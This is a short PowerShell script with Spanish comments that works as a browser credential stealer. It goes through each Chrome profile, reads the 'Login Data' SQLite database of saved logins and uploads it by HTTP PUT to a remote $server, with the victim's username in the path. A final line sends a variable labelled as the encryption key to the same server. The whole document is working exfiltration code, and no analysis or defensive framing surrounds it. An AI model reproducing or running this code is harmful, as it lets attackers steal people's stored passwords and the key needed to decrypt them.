#Extraer y enviar LOGIN DATA (BASE DE DATOS con credenciales SQLITE)
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\"

$profiles = Get-ChildItem $path | Where-Object { $_.Name -like "Profile*"} | Select-Object "Name"
if ($profiles) {
    foreach ($profile in $profiles) {
        $file_name = $profile.Name -replace " ", ""
        $file_logins = "$env:LOCALAPPDATA\Google\Chrome\User Data\$($profile.Name)\login data"
        Invoke-WebRequest -Uri $server/login_data_$env:USERNAME_$file_name -Method PUT -InFile $file_logins -ContentType "application/octet-stream"
    }
}

$file_login_default = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\login data"

if (Test-Path $file_login_default) {
    Invoke-WebRequest -Uri $server/login_data_$env:USERNAME -Method PUT -InFile $file_login_default -ContentType "application/octet-stream"
}

# Envio de clave de cifrado
Invoke-RestMethod -Uri $server/password_$env:USERNAME -Method PUT -Body ($cont) -ContentType "text/plain"



